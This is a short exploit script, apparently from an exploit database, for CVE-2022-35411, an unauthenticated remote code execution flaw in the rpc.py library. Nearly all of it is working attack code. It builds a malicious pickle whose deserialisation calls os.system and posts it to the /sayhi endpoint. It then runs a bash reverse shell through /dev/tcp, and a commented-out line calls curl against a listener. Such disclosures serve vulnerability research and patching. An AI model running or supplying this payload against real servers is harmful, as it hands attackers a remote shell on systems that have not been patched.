# Exploit Title: Remote Code Execution in rpc.py through 0.6.0
# Google Dork: N/A
# Date: 2022-07-12
# Exploit Author: Elias Hohl
# Vendor Homepage: https://github.com/abersheeran
# Software Link: https://github.com/abersheeran/rpc.py
# Version: v0.4.2 - v0.6.0
# Tested on: Debian 11, Ubuntu 20.04
# CVE : CVE-2022-35411

import requests
import pickle

# Unauthenticated RCE 0-day for https://github.com/abersheeran/rpc.py

HOST = "127.0.0.1:65432"

URL = f"http://{HOST}/sayhi"

HEADERS = {
    "serializer": "pickle"
}


def generate_payload(cmd):

    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)

    payload = pickle.dumps(PickleRce())

    print(payload)

    return payload


def exec_command(cmd):

    payload = generate_payload(cmd)

    requests.post(url=URL, data=payload, headers=HEADERS)


def main():
    # exec_command('curl http://127.0.0.1:4321')
    exec_command('bash -i >& /dev/tcp/127.0.0.1/1234 0>&1')
    # exec_command('uname')


if __name__ == "__main__":
    main()